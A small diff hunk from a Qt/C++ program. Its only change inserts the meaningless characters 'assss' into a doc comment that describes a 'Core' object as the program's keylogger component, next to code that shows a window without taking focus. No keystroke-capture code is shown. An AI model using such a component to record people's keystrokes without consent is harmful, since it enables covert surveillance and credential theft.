@@ -16,7 +16,7 @@ Wrapper::Wrapper(QWidget *parent) :
         setAttribute(Qt::WA_ShowWithoutActivating);
     }
 
-    /**
+    /**assss
      * @brief The core compontent (Keylogger) of the program.
      */
     Core *core = new Core(this);
